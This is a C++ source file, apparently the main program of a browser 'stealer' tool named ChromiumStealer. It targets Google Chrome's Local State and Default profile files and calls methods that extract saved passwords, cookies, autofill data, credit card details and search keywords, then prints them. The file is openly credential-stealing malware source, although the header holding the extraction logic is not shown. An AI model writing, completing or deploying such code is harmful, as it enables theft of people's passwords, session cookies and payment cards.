#include "chromiumstealer.hpp"

int main()
{
	if (!utils::console::is_windows()) {
		printf("The operating system has to be Windows NT\n");
		exit(EXIT_FAILURE);
	}

	if (!utils::console::set_utf8()) {
		printf("Couldn't set console IO to utf8 encoding.\nConsole IO could show gibberish texts.\n");
	}

	// Path to browser files
	std::string local_state_path = "Google\\Chrome\\User Data\\Local State";
	std::string database_path = "Google\\Chrome\\User Data\\Default";

	ChromiumStealer stealer(local_state_path, database_path);

	// Initialize the stealer class
	stealer.initialize();

	std::vector<ChromiumStealer::cookie_data> cookies_data = stealer.get_cookies();
	std::vector<ChromiumStealer::password_data> pass_data = stealer.get_password();
	std::vector<ChromiumStealer::autofill_data> auto_data = stealer.get_autofill();
	std::vector<ChromiumStealer::creditc_data> card_data = stealer.get_credit_card();
	std::vector<ChromiumStealer::keyword_data> key_data = stealer.get_keywords();
	std::vector<ChromiumStealer::status_data> status_data = stealer.get_status();

	// Print results
	std::string passwords_result = stealer.print_passwords(pass_data);
	std::string cookies_result = stealer.print_cookies(cookies_data);
	std::string autofills_result = stealer.print_autofills(auto_data);
	std::string credit_cards_result = stealer.print_credit_cards(card_data);
	std::string keywords_result = stealer.print_keywords(key_data);
	std::string statuses_result = stealer.print_statuses(status_data);

	printf("Passwords Result: %s\n", passwords_result.c_str());
	printf("Cookies Result: %s\n", cookies_result.c_str());
	printf("Autofills Result: %s\n", autofills_result.c_str());
	printf("Credit Cards Result: %s\n", credit_cards_result.c_str());
	printf("Keywords Result: %s\n", keywords_result.c_str());
	printf("Statuses Result: %s\n", statuses_result.c_str());
}